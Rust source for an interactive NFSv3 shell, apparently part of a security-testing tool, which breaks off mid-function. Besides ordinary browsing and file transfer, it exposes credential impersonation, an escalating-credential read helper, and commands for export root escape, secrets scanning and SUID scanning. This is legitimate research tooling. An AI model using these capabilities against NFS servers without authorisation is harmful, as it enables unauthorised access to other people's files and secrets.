//! Interactive NFS shell  --  readline-based REPL for browsing NFS exports.
//!
//! Provides a Unix-shell-like interface over NFSv3 using READDIRPLUS, LOOKUP,
//! READ, WRITE, and GETATTR. Commands mirror familiar Unix tools so security
//! researchers can explore exports without mounting them via the kernel NFS client.

use std::future::Future;
use std::io::Write as _;
use std::path::Path;
use std::pin::Pin;
use std::sync::{Arc, Mutex};

use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
use sha2::{Digest, Sha256};

use colored::Colorize as _;
use nfs3_types::nfs3::{
    CREATE3args, GETATTR3args, LOOKUP3args, MKDIR3args, MKNOD3args, Nfs3Option, Nfs3Result, READ3args, READDIRPLUS3args, READLINK3args, REMOVE3args, RENAME3args, RMDIR3args, SETATTR3args, SYMLINK3args, WRITE3args, cookieverf3, createhow3, devicedata3, diropargs3, filename3, mknoddata3, nfspath3,
    sattr3, set_atime, set_mtime, specdata3, stable_how, symlinkdata3,
};
use nfs3_types::xdr_codec::Opaque;

use crate::engine::credential::escalation_list;
use crate::engine::file_handle::FileHandleAnalyzer;
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::nfs3::client::Nfs3Client;
use crate::proto::nfs3::types::{DirEntryPlus, FileAttrs, FileHandle, FileType};

/// Maximum bytes to read in a single `cat` command.
const CAT_MAX_BYTES: u32 = 1_048_576; // 1 MiB

/// Maximum bytes per NFS READ/WRITE chunk.
const CHUNK_SIZE: u32 = 65_536; // 64 KiB

/// All commands available in the interactive shell (for Tab completion of the first token).
pub const SHELL_COMMANDS: &[&str] = &[
    "ls",
    "cd",
    "pwd",
    "tree",
    "find",
    "cat",
    "get",
    "put",
    "rm",
    "mkdir",
    "rmdir",
    "mv",
    "cp",
    "chmod",
    "chown",
    "stat",
    "readlink",
    "symlink",
    "uid",
    "gid",
    "hostname",
    "whoami",
    "impersonate",
    "mknod",
    "suid-scan",
    "world-writable",
    "secrets-scan",
    "escape-root",
    "mount-handle",
    "handle",
    "lcd",
    "lls",
    "lpwd",
    "lmkdir",
    "history",
    "help",
    "exit",
    "quit",
];

/// State shared between `NfsShell` and `NfsCompleter` for Tab completion.
///
/// Updated after every successful `cd`. The completer reads this without
/// holding any async locks (std Mutex, not tokio).
pub struct TabCache {
    /// File handle of the directory whose entries are cached.
    pub cwd: FileHandle,
    /// Names of entries in `cwd` (updated after navigation).
    pub entries: Vec<String>,
}

// =============================================================================
// Tab completer  --  rustyline Helper implementation
// =============================================================================

/// Rustyline helper that provides Tab completion for the NFS shell.
///
/// Completes:
/// - Shell commands when at the start of a line
/// - Remote paths for file-argument commands (uses cached or live READDIRPLUS)
pub struct NfsCompleter {
    /// NFS client for live path lookups when the cache doesn't cover the directory.
    pub nfs3: Arc<Nfs3Client>,
    /// Export root handle (for absolute path resolution from `/`).
    pub export_root: FileHandle,
    /// Shared cache of the current directory's entry names.
    /// Populated by `NfsShell::refresh_tab_cache()` after each `cd`.
    pub cache: Arc<Mutex<TabCache>>,
}

impl rustyline::completion::Completer for NfsCompleter {
    type Candidate = String;

    fn complete(&self, line: &str, pos: usize, _ctx: &rustyline::Context<'_>) -> rustyline::Result<(usize, Vec<String>)> {
        let fragment = &line[..pos];

        // --- Command completion (first token, no space yet) ---
        if !fragment.contains(' ') {
            let prefix = fragment;
            let mut matches: Vec<String> = SHELL_COMMANDS.iter().filter(|c| c.starts_with(prefix)).map(|c| (*c).to_owned()).collect();
            matches.sort();
            return Ok((0, matches));
        }

        // --- Path completion (second+ token) ---
        let arg_start = fragment.rfind(' ').map_or(0, |i| i + 1);
        let path_partial = &fragment[arg_start..];

        // Split at the last '/' to find the directory prefix and the name prefix.
        let (dir_str, name_prefix, name_start) = if let Some(slash) = path_partial.rfind('/') {
            let dir = &path_partial[..=slash]; // includes the trailing slash
            let name = &path_partial[slash + 1..];
            (dir.to_owned(), name, arg_start + slash + 1)
        } else {
            (String::new(), path_partial, arg_start)
        };

        // Fetch entries for the directory.
        let entries = if dir_str.is_empty() {
            // Use the cached current-directory entries.
            self.cache.lock().map_or_else(|_| Vec::new(), |g| g.entries.clone())
        } else {
            // Live lookup via block_in_place (we are inside an async task but
            // rustyline calls complete() synchronously; block_in_place moves the
            // blocking work off the async thread pool safely).
            let nfs3 = Arc::clone(&self.nfs3);
            let export_root = self.export_root.clone();
            let cwd_fh = self.cache.lock().map_or_else(|_| export_root.clone(), |g| g.cwd.clone());
            let dir_owned = dir_str;
            tokio::task::block_in_place(|| {
                tokio::runtime::Handle::current().block_on(async move {
                    let (start, rel) = if dir_owned.starts_with('/') { (export_root, dir_owned.trim_start_matches('/').trim_end_matches('/').to_owned()) } else { (cwd_fh, dir_owned.trim_end_matches('/').to_owned()) };
                    let dir_fh = if rel.is_empty() {
                        start
                    } else {
                        match lookup_path_from(&nfs3, &start, &rel).await {
                            Ok((fh, _)) => fh,
                            Err(_) => return Vec::new(),
                        }
                    };
                    match try_readdirplus(&nfs3, &dir_fh).await {
                        Ok(es) => es.into_iter().filter(|e| e.name != "." && e.name != "..").map(|e| e.name).collect(),
                        Err(_) => Vec::new(),
                    }
                })
            })
        };

        let mut matches: Vec<String> = entries.into_iter().filter(|e| e.starts_with(name_prefix) && e != "." && e != "..").collect();
        matches.sort();
        Ok((name_start, matches))
    }
}

// rustyline requires the Helper trait which combines Completer + Hinter + Highlighter + Validator.
// We only care about Completer; the rest get no-op implementations.
impl rustyline::hint::Hinter for NfsCompleter {
    type Hint = String;
}
impl rustyline::highlight::Highlighter for NfsCompleter {}
impl rustyline::validate::Validator for NfsCompleter {}
impl rustyline::Helper for NfsCompleter {}

/// Interactive NFS shell  --  browse and extract files from an NFS export.
///
/// Maintains a current working directory handle and path string so that
/// relative `cd` and `ls` operations feel like a local shell. Stores the
/// export root handle separately so `cd /` and absolute paths always work.
pub struct NfsShell {
    /// Pool-backed NFS client used for all RPC calls.
    nfs3: Arc<Nfs3Client>,
    /// Export root handle -- the handle returned by MOUNT. Used for `cd /` and
    /// absolute path resolution. File handles are bearer tokens (RFC 1094 sec. 2.3.3).
    export_root: FileHandle,
    /// File handle for the current directory.
    cwd: FileHandle,
    /// Human-readable path of the current directory (best-effort).
    cwd_path: String,
    /// When false, write operations are refused with an informative message.
    allow_write: bool,
    /// AUTH_SYS machine name sent with every RPC call.
    /// Changeable mid-session via the `hostname <name>` command.
    hostname: String,
    /// In-session command history for the `history` command.
    history: Vec<String>,
    /// Shared state for the Tab completer. Updated after every successful cd.
    /// The Mutex is std (not tokio) so the sync completer can lock it without
    /// block_in_place overhead.
    tab_cache: Arc<Mutex<TabCache>>,
}

impl NfsShell {
    /// Create a new shell rooted at `root_fh` on the given client.
    #[must_use]
    pub fn new(nfs3: Arc<Nfs3Client>, root_fh: FileHandle, allow_write: bool, hostname: String) -> Self {
        let tab_cache = Arc::new(Mutex::new(TabCache { cwd: root_fh.clone(), entries: Vec::new() }));
        Self { nfs3, export_root: root_fh.clone(), cwd: root_fh, cwd_path: "/".to_owned(), allow_write, hostname, history: Vec::new(), tab_cache }
    }

    /// Return the current directory path for use in the prompt.
    #[must_use]
    pub fn cwd_path(&self) -> &str {
        &self.cwd_path
    }

    /// Build a Tab completer that shares the directory cache with this shell.
    ///
    /// Call once after construction; pass the result to rustyline `Editor::set_helper`.
    pub fn make_completer(&self) -> NfsCompleter {
        NfsCompleter { nfs3: Arc::clone(&self.nfs3), export_root: self.export_root.clone(), cache: Arc::clone(&self.tab_cache) }
    }

    /// Refresh the Tab completion cache with the current directory's entries.
    ///
    /// Called after every successful `cd` so Tab completion is immediately
    /// accurate in the new directory without an extra RPC on the first Tab press.
    async fn refresh_tab_cache(&self) {
        let entries = match try_readdirplus(&self.nfs3, &self.cwd).await {
            Ok(es) => es.into_iter().filter(|e| e.name != "." && e.name != "..").map(|e| e.name).collect(),
            Err(_) => Vec::new(),
        };
        if let Ok(mut cache) = self.tab_cache.lock() {
            cache.cwd = self.cwd.clone();
            cache.entries = entries;
        }
    }

    /// Parse a command line and dispatch to the appropriate handler.
    ///
    /// Errors from NFS operations are printed to stderr and do not abort the
    /// shell -- the user can retry or navigate away.
    pub async fn dispatch(&mut self, line: &str) {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            return;
        }

        // Track history (skip duplicate consecutive entries).
        if self.history.last().map(String::as_str) != Some(line) {
            self.history.push(line.to_owned());
        }

        let mut parts = line.splitn(2, ' ');
        let cmd = parts.next().unwrap_or("");
        let arg = parts.next().unwrap_or("").trim();

        match cmd {
            // Navigation
            "ls" => self.cmd_ls(arg).await,
            "cd" => self.cmd_cd(arg).await,
            "pwd" => println!("{}", self.cwd_path),
            "tree" => self.cmd_tree(arg).await,
            "find" => self.cmd_find(arg).await,
            // File ops
            "cat" => self.cmd_cat(arg).await,
            "get" => self.cmd_get(arg).await,
            "put" => self.cmd_put(arg).await,
            "rm" => self.cmd_rm(arg).await,
            "mkdir" => self.cmd_mkdir(arg).await,
            "rmdir" => self.cmd_rmdir(arg).await,
            "mv" => self.cmd_mv(arg).await,
            "cp" => self.cmd_cp(arg).await,
            // Permissions
            "chmod" => self.cmd_chmod(arg).await,
            "chown" => self.cmd_chown(arg).await,
            "stat" => self.cmd_stat(arg).await,
            "readlink" => self.cmd_readlink(arg).await,
            "symlink" => self.cmd_symlink(arg).await,
            // Identity
            "uid" => self.cmd_uid(arg),
            "gid" => self.cmd_gid(arg),
            "hostname" => self.cmd_hostname(arg),
            "whoami" => self.cmd_whoami(),
            "impersonate" => self.cmd_impersonate(arg),
            // Devices
            "mknod" => self.cmd_mknod(arg).await,
            // Analysis
            "suid-scan" => self.cmd_suid_scan().await,
            "world-writable" => self.cmd_world_writable().await,
            "secrets-scan" => self.cmd_secrets_scan().await,
            // Escape
            "escape-root" => self.cmd_escape_root().await,
            "mount-handle" => self.cmd_mount_handle(arg).await,
            // Handle info
            "handle" => println!("{}", self.cwd.to_hex()),
            // Local ops
            "lcd" => self.cmd_lcd(arg),
            "lls" => self.cmd_lls(arg),
            "lpwd" => self.cmd_lpwd(),
            "lmkdir" => self.cmd_lmkdir(arg),
            // Session
            "history" => self.cmd_history(),
            "help" | "?" => print_help(),
            "exit" | "quit" => {},
            _ => eprintln!("{}", format!("unknown command: {cmd}  (try 'help')").yellow()),
        }
    }

    // -------------------------------------------------------------------------
    // Navigation
    // -------------------------------------------------------------------------

    /// List directory contents with type indicator, permissions, uid, gid, size.
    /// List directory contents.
    ///
    /// Usage: `ls [-a] [--sort=FIELD] [-r|--reverse] [path]`
    ///
    /// Default columns: mode, uid, gid, size, mtime, name.
    /// With `-a`: adds inode, nlink, used, rdev, atime, ctime columns.
    /// `.` and `..` are always the first two rows regardless of sort order.
    /// When sorting by ctime or atime that timestamp replaces mtime in the default view.
    async fn cmd_ls(&self, raw: &str) {
        let (sort, reverse, all_cols, path_str) = parse_ls_args(raw);
        let target = if path_str.is_empty() { None } else { Some(path_str) };

        let dir_fh = match self.resolve_handle(target).await {
            Ok(fh) => fh,
            Err(e) => {
                eprintln!("{}", format!("ls: {e}").red());
                return;
            },
        };

        let all_entries = match list_dir(&self.nfs3, &dir_fh).await {
            Ok(v) => v,
            Err(e) => {
                eprintln!("{}", format!("ls: {e}").red());
                return;
            },
        };

        // Separate . and .. (always pinned first) from the remaining entries.
        let mut dot: Option<&DirEntryPlus> = None;
        let mut dotdot: Option<&DirEntryPlus> = None;
        let mut rest: Vec<&DirEntryPlus> = Vec::with_capacity(all_entries.len());
        for e in &all_entries {
            if e.name == "." {
                dot = Some(e);
            } else if e.name == ".." {
                dotdot = Some(e);
            } else {
                rest.push(e);
            }
        }

        // Stable sort the non-dot entries, then optionally reverse.
        rest.sort_by(|a, b| ls_cmp(a, b, sort));
        if reverse {
            rest.reverse();
        }

        if all_cols {
            // Extended header: all 13 fattr3 fields.
            println!("{:>10}  {:<10}  {:>4}  {:>8}  {:>8}  {:>12}  {:>12}  {:>11}  {:<19}  {:<19}  {:<19}  name", "inode", "mode", "nlink", "uid", "gid", "size", "used", "rdev", "atime", "mtime", "ctime");
            println!("{}", "-".repeat(148).dimmed());
        } else {
            // Default header: the most useful columns for everyday browsing.
            let time_label = match sort {
                LsSort::Ctime => "ctime",
                LsSort::Atime => "atime",
                _ => "mtime",
            };
            println!("{:<10}  {:>8}  {:>8}  {:>12}  {:<19}  name", "mode", "uid", "gid", "size", time_label);
            println!("{}", "-".repeat(75).dimmed());
        }

        let print_entry = |entry: &DirEntryPlus| {
            let tc = entry.attrs.as_ref().map_or('?', type_char);
            let mode_str = entry.attrs.as_ref().map_or_else(|| "?????????".to_owned(), |a| format_mode(a.mode));
            let uid = entry.attrs.as_ref().map_or(0u32, |a| a.uid);
            let gid = entry.attrs.as_ref().map_or(0u32, |a| a.gid);
            let size = entry.attrs.as_ref().map_or(0u64, |a| a.size);
            let name_str = colorize_name(&entry.name, tc);

            if all_cols {
                let nlink = entry.attrs.as_ref().map_or(0u32, |a| a.nlink);
                let inode = entry.attrs.as_ref().map_or(entry.fileid, |a| a.fileid);
                let used = entry.attrs.as_ref().map_or(0u64, |a| a.used);
                let rdev = entry.attrs.as_ref().map(|a| if a.file_type == FileType::Block || a.file_type == FileType::Character { format!("{}:{}", a.rdev.0, a.rdev.1) } else { "-".to_owned() });
                let rdev_str = rdev.unwrap_or_else(|| "-".to_owned());
                let atime = entry.attrs.as_ref().map_or_else(|| "????-??-?? ??:??:??".to_owned(), |a| fmt_unix_time(a.atime.seconds));
                let mtime = entry.attrs.as_ref().map_or_else(|| "????-??-?? ??:??:??".to_owned(), |a| fmt_unix_time(a.mtime.seconds));
                let ctime = entry.attrs.as_ref().map_or_else(|| "????-??-?? ??:??:??".to_owned(), |a| fmt_unix_time(a.ctime.seconds));
                println!("{inode:>10}  {tc}{mode_str}  {nlink:4}  {uid:8}  {gid:8}  {size:12}  {used:12}  {rdev_str:>11}  {atime}  {mtime}  {ctime}  {name_str}");
            } else {
                // Show the sorted-by timestamp so the displayed value matches the sort key.
                let time_secs = entry.attrs.as_ref().map(|a| match sort {
                    LsSort::Ctime => a.ctime.seconds,
                    LsSort::Atime => a.atime.seconds,
                    _ => a.mtime.seconds,
                });
                let time_str = time_secs.map_or_else(|| "????-??-?? ??:??:??".to_owned(), fmt_unix_time);
                println!("{tc}{mode_str}  {uid:8}  {gid:8}  {size:12}  {time_str}  {name_str}");
            }
        };

        // Emit . then .. (pinned), then sorted rest.
        if let Some(e) = dot {
            print_entry(e);
        }
        if let Some(e) = dotdot {
            print_entry(e);
        }
        for e in &rest {
            print_entry(e);
        }
    }

    /// Change the current directory handle and update the path string.
    ///
    /// Absolute paths (starting with '/') are resolved from the export root.
    /// '/' alone resets to the export root without a network call.
    async fn cmd_cd(&mut self, target: &str) {
        let target = if target.is_empty() { "/" } else { target };

        // Fast path: cd / always resets to mount root without an RPC.
        if target == "/" {
            self.cwd.clone_from(&self.export_root);
            "/".clone_into(&mut self.cwd_path);
            self.refresh_tab_cache().await;
            return;
        }

        // For absolute paths, resolve from the export root.
        let (start_fh, path_base, rel) = if target.starts_with('/') { (self.export_root.clone(), "/", target.trim_start_matches('/')) } else { (self.cwd.clone(), self.cwd_path.as_str(), target) };

        // Empty relative part after stripping prefix means we asked for "/".
        if rel.is_empty() {
            self.cwd.clone_from(&self.export_root);
            "/".clone_into(&mut self.cwd_path);
            return;
        }

        match lookup_path_from(&self.nfs3, &start_fh, rel).await {
            Ok((fh, attrs)) => {
                if attrs.file_type != FileType::Directory {
                    eprintln!("{}", format!("cd: {target}: not a directory").red());
                    return;
                }
                self.cwd = fh;
                self.cwd_path = build_path(path_base, rel);
                self.refresh_tab_cache().await;
            },
            Err(e) => eprintln!("{}", format!("cd: {target}: {e}").red()),
        }
    }

    /// Recursive directory tree display.
    async fn cmd_tree(&self, arg: &str) {
        let max_depth = arg.parse::<usize>().unwrap_or(3);
        println!("{}", self.cwd_path.bold());
        tree_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), String::new(), 0, max_depth).await;
    }

    /// Find files whose names contain the pattern (case-insensitive substring).
    async fn cmd_find(&self, pattern: &str) {
        if pattern.is_empty() {
            eprintln!("{}", "usage: find <pattern>".yellow());
            return;
        }
        find_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), self.cwd_path.clone(), pattern.to_ascii_lowercase()).await;
    }

    // -------------------------------------------------------------------------
    // File operations
    // -------------------------------------------------------------------------

    /// Read and print file contents to stdout.
    async fn cmd_cat(&self, name: &str) {
        if name.is_empty() {
            eprintln!("{}", "usage: cat <file>".yellow());
            return;
        }
        let (fh, _) = match self.lookup_path(name).await {
            Ok(pair) => pair,
            Err(e) => {
                eprintln!("{}", format!("cat: {name}: {e}").red());
                return;
            },
        };
        if let Err(e) = read_escalated(&self.nfs3, &fh).await {
            eprintln!("{}", format!("cat: {name}: {e}").red());
        }
    }

    /// Download a remote file or directory tree to a local path.
    ///
    /// Flags:
    ///   `-r`               recurse into directories (mirrors tree locally)
    ///   `--verify <hash>`  assert SHA-256 of downloaded file matches `<hash>`
    ///
    /// Flags may appear in any position (before or after the positional
    /// args). This matters in non-interactive mode (`shell -c "get foo
    /// bar --verify HEX"`) where clap is not in the loop and we have to
    /// tokenise the line ourselves.
    async fn cmd_get(&self, line: &str) {
        let tokens: Vec<&str> = line.split_whitespace().collect();
        let mut recursive = false;
        let mut verify_hash: Option<String> = None;
        let mut positional: Vec<&str> = Vec::with_capacity(2);
        let mut iter = tokens.iter().copied();
        while let Some(tok) = iter.next() {
            match tok {
                "-r" => recursive = true,
                "--verify" => {
                    if let Some(h) = iter.next() {
                        verify_hash = Some(h.to_owned());
                    } else {
                        eprintln!("{}", "get: --verify requires a hex SHA-256 hash".red());
                        return;
                    }
                },
                t if t.starts_with("--") => {
                    eprintln!("{}", format!("get: unknown flag {t}").red());
                    return;
                },
                t => positional.push(t),
            }
        }
        let Some(&remote) = positional.first() else {
            eprintln!("{}", "usage: get [-r] [--verify <sha256>] <remote> [local]".yellow());
            return;
        };
        let local = positional.get(1).copied().unwrap_or("");

        let (fh, attrs) = match self.lookup_path(remote).await {
            Ok(pair) => pair,
            Err(e) => {
                eprintln!("{}", format!("get: {remote}: {e}").red());
                return;
            },
        };

        let dest = if local.is_empty() { remote.rsplit('/').next().unwrap_or(remote) } else { local };

        if recursive && attrs.file_type == FileType::Directory {
            let mp = MultiProgress::new();
            match download_tree(&self.nfs3, &fh, dest, &mp).await {
                Ok(bytes) => println!("{}", format!("saved {bytes} bytes -> {dest}/").green()),
                Err(e) => eprintln!("{}", format!("get -r: {e}").red()),
            }
        } else {
            match download_file(&self.nfs3, &fh, dest, attrs.size).await {
                Ok((bytes, hash)) => {
                    println!("{}", format!("saved {bytes} bytes -> {dest}  sha256:{hash}").green());
                    if let Some(ref expected) = verify_hash {
                        if hash.eq_ignore_ascii_case(expected) {
                            println!("{}", "sha256 verified".green());
                        } else {
                            eprintln!("{}", format!("get: sha256 mismatch  expected:{expected}  got:{hash}").red());
                        }
                    }
                },
                Err(e) => eprintln!("{}", format!("get: {e}").red()),
            }
        }
    }

    /// Upload a local file or directory tree to the remote export.
    ///
    /// Add `-r` before the local path to upload an entire directory recursively.
    async fn cmd_put(&self, line: &str) {
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let mut recursive = false;
        let mut rest = line.trim();
        if let Some(r) = rest.strip_prefix("-r") {
            recursive = true;
            rest = r.trim_start();
        }

        let (local, remote) = split2(rest);
        if local.is_empty() || remote.is_empty() {
            eprintln!("{}", "usage: put [-r] <local> <remote>".yellow());
            return;
        }

        let local_path = Path::new(local);

        if recursive && local_path.is_dir() {
            let (remote_parent_fh, remote_dir_name) = match self.resolve_parent(remote).await {
                Ok(p) => p,
                Err(e) => {
                    eprintln!("{}", format!("put -r: {e}").red());
                    return;
                },
            };
            let dir_fh = match create_remote_dir(&self.nfs3, &remote_parent_fh, &remote_dir_name).await {
                Ok(fh) => fh,
                Err(e) => {
                    eprintln!("{}", format!("put -r: create dir {remote}: {e}").red());
                    return;
                },
            };
            let mp = MultiProgress::new();
            match upload_tree(&self.nfs3, local_path, &dir_fh, &mp).await {
                Ok(bytes) => println!("{}", format!("put -r: {bytes} bytes -> {remote}/").green()),
                Err(e) => eprintln!("{}", format!("put -r: {e}").red()),
            }
            return;
        }

        let data = match std::fs::read(local) {
            Ok(d) => d,
            Err(e) => {
                eprintln!("{}", format!("put: cannot read {local}: {e}").red());
                return;
            },
        };

        let (parent_fh, filename) = match self.resolve_parent(remote).await {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{}", format!("put: {e}").red());
                return;
            },
        };

        let file_fh = match create_remote(&self.nfs3, &parent_fh, &filename).await {
            Ok(fh) => fh,
            Err(e) => {
                eprintln!("{}", format!("put: create {remote}: {e}").red());
                return;
            },
        };

        match upload_data(&self.nfs3, &file_fh, &data).await {
            Ok(n) => println!("{}", format!("put: {n} bytes -> {remote}").green()),
            Err(e) => eprintln!("{}", format!("put: write error: {e}").red()),
        }
    }

    /// Remove a remote file.
    async fn cmd_rm(&self, path: &str) {
        if path.is_empty() {
            eprintln!("{}", "usage: rm <file>".yellow());
            return;
        }
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let (parent_fh, filename) = match self.resolve_parent(path).await {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{}", format!("rm: {e}").red());
                return;
            },
        };
        let args = REMOVE3args { object: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(filename.into_bytes())) } };
        match self.nfs3.remove(&args).await {
            Ok(Nfs3Result::Ok(_)) => println!("{}", format!("removed {path}").green()),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("rm: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("rm: {e}").red()),
        }
    }

    /// Create a remote directory.
    async fn cmd_mkdir(&self, path: &str) {
        if path.is_empty() {
            eprintln!("{}", "usage: mkdir <dir>".yellow());
            return;
        }
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let (parent_fh, dirname) = match self.resolve_parent(path).await {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{}", format!("mkdir: {e}").red());
                return;
            },
        };
        let args = MKDIR3args { where_: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(dirname.into_bytes())) }, attributes: sattr3::default() };
        match self.nfs3.mkdir(&args).await {
            Ok(Nfs3Result::Ok(_)) => println!("{}", format!("created {path}").green()),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("mkdir: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("mkdir: {e}").red()),
        }
    }

    /// Remove a remote directory.
    async fn cmd_rmdir(&self, path: &str) {
        if path.is_empty() {
            eprintln!("{}", "usage: rmdir <dir>".yellow());
            return;
        }
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let (parent_fh, dirname) = match self.resolve_parent(path).await {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{}", format!("rmdir: {e}").red());
                return;
            },
        };
        let args = RMDIR3args { object: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(dirname.into_bytes())) } };
        match self.nfs3.rmdir(&args).await {
            Ok(Nfs3Result::Ok(_)) => println!("{}", format!("removed {path}").green()),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("rmdir: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("rmdir: {e}").red()),
        }
    }

    /// Rename a remote file (mv src dst).
    async fn cmd_mv(&self, line: &str) {
        let (src, dst) = split2(line);
        if src.is_empty() || dst.is_empty() {
            eprintln!("{}", "usage: mv <src> <dst>".yellow());
            return;
        }
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let ((from_fh, from_name), (to_fh, to_name)) = match (self.resolve_parent(src).await, self.resolve_parent(dst).await) {
            (Ok(a), Ok(b)) => (a, b),
            (Err(e), _) | (_, Err(e)) => {
                eprintln!("{}", format!("mv: {e}").red());
                return;
            },
        };

        let args = RENAME3args { from: diropargs3 { dir: from_fh.to_nfs_fh3(), name: filename3(Opaque::owned(from_name.into_bytes())) }, to: diropargs3 { dir: to_fh.to_nfs_fh3(), name: filename3(Opaque::owned(to_name.into_bytes())) } };
        match self.nfs3.rename(&args).await {
            Ok(Nfs3Result::Ok(_)) => println!("{}", format!("{src} -> {dst}").green()),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("mv: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("mv: {e}").red()),
        }
    }

    /// Copy a remote file (READ + CREATE + WRITE).
    async fn cmd_cp(&self, line: &str) {
        let (src, dst) = split2(line);
        if src.is_empty() || dst.is_empty() {
            eprintln!("{}", "usage: cp <src> <dst>".yellow());
            return;
        }
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let (src_fh, _) = match self.lookup_path(src).await {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{}", format!("cp: {src}: {e}").red());
                return;
            },
        };

        let data = match read_all(&self.nfs3, &src_fh).await {
            Ok(d) => d,
            Err(e) => {
                eprintln!("{}", format!("cp: read {src}: {e}").red());
                return;
            },
        };

        let (parent_fh, filename) = match self.resolve_parent(dst).await {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{}", format!("cp: {e}").red());
                return;
            },
        };

        let dst_fh = match create_remote(&self.nfs3, &parent_fh, &filename).await {
            Ok(fh) => fh,
            Err(e) => {
                eprintln!("{}", format!("cp: create {dst}: {e}").red());
                return;
            },
        };

        match upload_data(&self.nfs3, &dst_fh, &data).await {
            Ok(n) => println!("{}", format!("copied {n} bytes {src} -> {dst}").green()),
            Err(e) => eprintln!("{}", format!("cp: write {dst}: {e}").red()),
        }
    }

    // -------------------------------------------------------------------------
    // Permissions
    // -------------------------------------------------------------------------

    /// Set file mode via SETATTR (chmod 755 file).
    async fn cmd_chmod(&self, line: &str) {
        let (mode_str, path) = split2(line);
        if mode_str.is_empty() || path.is_empty() {
            eprintln!("{}", "usage: chmod <octal-mode> <path>".yellow());
            return;
        }
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let Ok(mode) = u32::from_str_radix(mode_str, 8) else {
            eprintln!("{}", format!("chmod: invalid mode {mode_str}").red());
            return;
        };

        let fh = match self.resolve_handle(Some(path)).await {
            Ok(fh) => fh,
            Err(e) => {
                eprintln!("{}", format!("chmod: {e}").red());
                return;
            },
        };

        let attrs = sattr3 { mode: Nfs3Option::Some(mode), uid: Nfs3Option::None, gid: Nfs3Option::None, size: Nfs3Option::None, atime: set_atime::DONT_CHANGE, mtime: set_mtime::DONT_CHANGE };
        let args = SETATTR3args { object: fh.to_nfs_fh3(), new_attributes: attrs, guard: Nfs3Option::None };
        match self.nfs3.setattr(&args).await {
            Ok(Nfs3Result::Ok(_)) => println!("{}", format!("mode set to {mode_str} on {path}").green()),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("chmod: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("chmod: {e}").red()),
        }
    }

    /// Set file owner via SETATTR (chown uid:gid file  or  chown uid file).
    async fn cmd_chown(&self, line: &str) {
        let (spec, path) = split2(line);
        if spec.is_empty() || path.is_empty() {
            eprintln!("{}", "usage: chown <uid>[:<gid>] <path>".yellow());
            return;
        }
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let (uid_opt, gid_opt) = parse_uid_gid(spec);
        if uid_opt.is_none() && gid_opt.is_none() {
            eprintln!("{}", format!("chown: cannot parse {spec}").red());
            return;
        }

        let fh = match self.resolve_handle(Some(path)).await {
            Ok(fh) => fh,
            Err(e) => {
                eprintln!("{}", format!("chown: {e}").red());
                return;
            },
        };

        let attrs = sattr3 { mode: Nfs3Option::None, uid: uid_opt.map_or(Nfs3Option::None, Nfs3Option::Some), gid: gid_opt.map_or(Nfs3Option::None, Nfs3Option::Some), size: Nfs3Option::None, atime: set_atime::DONT_CHANGE, mtime: set_mtime::DONT_CHANGE };
        let args = SETATTR3args { object: fh.to_nfs_fh3(), new_attributes: attrs, guard: Nfs3Option::None };
        match self.nfs3.setattr(&args).await {
            Ok(Nfs3Result::Ok(_)) => println!("{}", format!("ownership set on {path}").green()),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("chown: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("chown: {e}").red()),
        }
    }

    /// Print detailed file attributes via GETATTR.
    async fn cmd_stat(&self, name: &str) {
        let fh = match self.resolve_handle(if name.is_empty() { None } else { Some(name) }).await {
            Ok(fh) => fh,
            Err(e) => {
                eprintln!("{}", format!("stat: {e}").red());
                return;
            },
        };
        let args = GETATTR3args { object: fh.to_nfs_fh3() };
        match self.nfs3.getattr(&args).await {
            Ok(Nfs3Result::Ok(ok)) => print_stat(if name.is_empty() { "." } else { name }, &FileAttrs::from_fattr3(&ok.obj_attributes)),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("stat: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("stat: {e}").red()),
        }
    }

    /// Read and print a symlink's target via READLINK.
    async fn cmd_readlink(&self, name: &str) {
        if name.is_empty() {
            eprintln!("{}", "usage: readlink <symlink>".yellow());
            return;
        }
        let (fh, _) = match self.lookup_path(name).await {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{}", format!("readlink: {name}: {e}").red());
                return;
            },
        };
        let args = READLINK3args { symlink: fh.to_nfs_fh3() };
        match self.nfs3.readlink(&args).await {
